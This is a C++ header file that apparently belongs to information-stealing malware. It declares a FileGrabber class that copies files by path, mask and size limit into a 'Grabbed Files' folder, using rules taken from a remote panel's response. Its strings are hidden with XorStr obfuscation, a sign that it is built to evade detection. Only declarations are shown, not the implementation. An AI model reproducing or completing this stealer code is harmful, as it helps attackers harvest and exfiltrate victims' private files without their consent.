#pragma once
struct FileGrabberRule
{
	vector<string> Path = vector<string>();
	vector<string> Mask = vector<string>();
	unsigned long long MaxFileSize;
	vector<string> Domains = vector<string>();
	vector<string> Exceptions = vector<string>();
	bool bRecursive;
	bool bActive;
};

class FileGrabber
{
private:
	vector<FileGrabberRule> fileGrabberRules;

	Panel* panel;
	string output_dir;
	string currentPath;
	unsigned long long MaxFilesSize;
	unsigned long long SumFileSizes = 0;

	void CopyByMask(string path, string mask, size_t size, const vector<string>& exceptions);
	void CopyByMaskRecursive(string path, string mask, size_t maxFileSize, const vector<string>& exceptions);
public:
	FileGrabber(Panel* panel, unsigned long long maxFilesSize)
	{
		output_dir = XorStr("Grabbed Files");
		this->panel = panel;
		MaxFilesSize = maxFilesSize;
	}

	bool GetRules(string response);
	void ProcessDomains(const vector<string>& hashes);
	void Grab();
};